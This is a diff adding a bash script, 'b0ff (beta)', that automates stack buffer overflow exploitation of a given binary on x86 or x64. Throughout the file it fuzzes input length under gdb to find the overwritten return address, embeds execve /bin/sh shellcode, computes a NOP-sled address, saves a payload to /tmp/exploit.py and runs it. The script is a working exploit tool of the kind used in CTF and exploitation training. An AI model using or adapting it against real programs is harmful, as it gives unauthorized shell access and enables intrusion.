@@ -1,0 +1,100 @@
+#!/bin/bash
+
+# b0ff (beta) by 0bfxgh0st*
+
+function help(){
+
+	printf "Usage bash $0 <binary> <buffer> <arch>\n"
+	printf "Examples:  bash $0 ./bin 600 x86\n"
+	printf "           bash $0 ./bin 1000 x64\n"
+	exit
+
+}
+
+if [[ -z $1 ]] || [[ -z $2 ]] || [[ -z $3 ]]
+then
+	help
+fi
+
+COL_RED="\e[0;31m"
+COL_GREEN="\e[0;32m"
+COL_END="\e[0m"
+
+binary="$1"
+start=0
+end="$2"
+
+function x86(){
+
+	for ((i=$start;i<=$end;i++))
+	do
+	
+		if [[ $(echo run $(python -c "print('A'*$i)") | gdb $binary | grep '0x41414141 in ?? ()') == "0x41414141 in ?? ()" ]]
+		then
+
+			shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+			p_len=$(printf $shellcode | wc -c)
+			offset=$(($i-4-$p_len))
+			printf "[${COL_GREEN}SHELLCODE${COL_END}] "
+			echo $shellcode | tr -s '\\' '\\\\'
+			printf "[${COL_GREEN}SHELLCODE SIZE${COL_END}] $p_len\n"
+			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"
+			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*4)')" -ex 'i r' -ex 'x/'$end'wx $esp' $binary --batch | grep '0x90909090' > /tmp/memories
+			# 13p can fail due address loc, needs to be a variable
+			mem=$(sed -n '13p' /tmp/memories | awk '{print $1}' | sed -e 's/0x/\\x/g' | tr -d ':' | sed 's/.\{2\}/&\\x/g' | sed -e 's/..$//g' | sed -e 's/^..//g')
+			address=$(echo ${mem:12:4}${mem:8:4}${mem:4:4}${mem:0:4})
+			printf "[${COL_GREEN}AVAILABLE MEMORY ADDRESS${COL_END}]\n"
+			cat /tmp/memories
+			printf "[${COL_GREEN}SELECTED ADDRESS${COL_END}] "
+			echo $address
+			echo "print(\"\x90\"*$offset + \"$shellcode\" + \"$address\")" > /tmp/exploit.py
+			printf "\n${COL_RED}Exploit saved in /tmp/exploit.py (execute with $binary \$(python2 /tmp/exploit.py)${COL_END}\n\n"
+			$binary $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "'$address'")')
+			exit
+		fi
+	done
+
+}
+
+function x64(){
+
+	for ((i=$start;i<=$end;i++))
+	do
+
+		if [[ $(echo run $(python -c "print('A'*$i)") | gdb $binary | grep '0x0000414141414141 in ?? ()') == "0x0000414141414141 in ?? ()" ]]
+		then
+
+			shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+			p_len=$(printf $shellcode | wc -c)
+			offset=$(($i-6-$p_len))
+			printf "[${COL_GREEN}SHELLCODE${COL_END}] "
+			echo $shellcode | tr -s '\\' '\\\\'
+			printf "[${COL_GREEN}SHELLCODE SIZE${COL_END}] $p_len\n"
+			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"
+			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*6)')" -ex 'i r' -ex 'x/'$end'wx $rsp' $binary --batch | grep '0x90909090' > /tmp/memories
+
+			# 11p can fail due address loc, needs to be a variable
+			mem=$(sed -n '11p' /tmp/memories | awk '{print $1}' | sed -e 's/0x/\\x/g' | tr -d ':' | sed 's/.\{2\}/&\\x/g' | sed -e 's/..$//g' | sed -e 's/^..//g')
+			address=$(echo ${mem:20:4}${mem:16:4}${mem:12:4}${mem:8:4}${mem:4:4}${mem:0:4})
+			printf "[${COL_GREEN}AVAILABLE MEMORY ADDRESS${COL_END}]\n"
+			cat /tmp/memories
+			printf "[${COL_GREEN}SELECTED ADDRESS${COL_END}] "
+			echo $address
+			echo "print(\"\x90\"*$offset + \"$shellcode\" + \"$address\")" > /tmp/exploit.py
+			printf "\n${COL_RED}Exploit saved in /tmp/exploit.py (execute with $binary \$(python2 /tmp/exploit.py)${COL_END}\n\n"
+			$binary $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "'$address'")')
+			exit
+		fi
+	done
+
+}
+
+if [[ "$3" == 'x86' ]]
+then
+	x86
+fi
+
+if [[ "$3" == 'x64' ]]
+then
+	x64
+fi
